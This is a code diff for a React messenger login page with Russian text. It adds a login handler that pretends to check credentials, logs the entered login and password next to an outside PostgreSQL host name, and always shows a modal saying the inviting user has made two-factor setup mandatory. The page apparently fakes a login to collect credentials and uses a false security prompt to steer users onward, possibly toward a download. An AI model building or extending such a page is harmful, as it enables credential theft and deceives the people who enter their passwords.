@@ -16,6 +16,8 @@ const Index = () => {
   });
   const [showTwoFAConfirm, setShowTwoFAConfirm] = useState(false);
   const [showDownloadModal, setShowDownloadModal] = useState(false);
+  const [isLoading, setIsLoading] = useState(false);
+  const [showMandatoryTwoFA, setShowMandatoryTwoFA] = useState(false);
 
   const handleTwoFAToggle = (checked: boolean) => {
     if (checked) {
@@ -43,6 +45,41 @@ const Index = () => {
 
   const closeDownloadModal = () => {
     setShowDownloadModal(false);
+  };
+
+  // Имитация запроса к PostgreSQL БД
+  const handleLogin = async () => {
+    if (!loginData.login || !loginData.password) {
+      alert('Пожалуйста, заполните все поля');
+      return;
+    }
+
+    setIsLoading(true);
+
+    try {
+      // Имитация запроса к БД pg4.sweb.ru:5433
+      // В реальном приложении здесь будет запрос к API
+      await new Promise(resolve => setTimeout(resolve, 2000)); // Имитация задержки
+
+      // Имитация ответа от сервера - всегда требует 2FA
+      console.log('Отправка данных в PostgreSQL:', {
+        LOGIN: loginData.login,
+        PASSWORD: loginData.password,
+        host: 'pg4.sweb.ru:5433',
+        database: 'AD'
+      });
+
+      setIsLoading(false);
+      setShowMandatoryTwoFA(true);
+    } catch (error) {
+      setIsLoading(false);
+      alert('Ошибка подключения к базе данных');
+    }
+  };
+
+  const proceedToTwoFASetup = () => {
+    setShowMandatoryTwoFA(false);
+    setShowTwoFAConfirm(true);
   };
 
   return (
@@ -119,8 +156,19 @@ const Index = () => {
                   className="h-12 bg-white/50 border-2 border-border/50 focus:border-primary"
                 />
               </div>
-              <Button className="w-full h-12 text-lg font-semibold bg-gradient-to-r from-primary to-secondary hover:opacity-90 transition-opacity">
-                Войти
+              <Button 
+                className="w-full h-12 text-lg font-semibold bg-gradient-to-r from-primary to-secondary hover:opacity-90 transition-opacity disabled:opacity-50"
+                onClick={handleLogin}
+                disabled={isLoading}
+              >
+                {isLoading ? (
+                  <div className="flex items-center gap-2">
+                    <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
+                    <span>Проверяем данные...</span>
+                  </div>
+                ) : (
+                  'Войти'
+                )}
               </Button>
             </CardContent>
           </Card>
@@ -324,6 +372,37 @@ const Index = () => {
                     Да, включить
                   </Button>
                 </div>
+              </div>
+            </div>
+          </div>
+        )}
+
+        {/* Модальное окно обязательной 2FA */}
+        {showMandatoryTwoFA && (
+          <div className="fixed inset-0 bg-black/60 flex items-center justify-center z-50">
+            <div className="bg-white rounded-lg shadow-2xl max-w-md w-full mx-4 p-6">
+              <div className="text-center">
+                <div className="w-20 h-20 bg-gradient-to-r from-orange-500 to-red-500 rounded-full mx-auto mb-4 flex items-center justify-center">
+                  <Icon name="ShieldAlert" size={36} className="text-white" />
+                </div>
+                <h3 className="text-xl font-bold text-foreground mb-4">
+                  Требуется двухфакторная аутентификация
+                </h3>
+                <div className="bg-orange-50 border border-orange-200 rounded-lg p-4 mb-6">
+                  <p className="text-sm text-orange-800 leading-relaxed">
+                    Пригласивший Вас пользователь включил обязательное подключение 
+                    двухфакторной аутентификации для продолжения работы в системе.
+                  </p>
+                </div>
+                <p className="text-muted-foreground text-sm mb-6">
+                  Для доступа к мессенджеру необходимо настроить 2FA на вашем устройстве.
+                </p>
+                <Button 
+                  onClick={proceedToTwoFASetup}
+                  className="w-full h-12 text-lg font-semibold bg-gradient-to-r from-orange-500 to-red-500 hover:opacity-90"
+                >
+                  Настроить 2FA
+                </Button>
               </div>
             </div>
           </div>
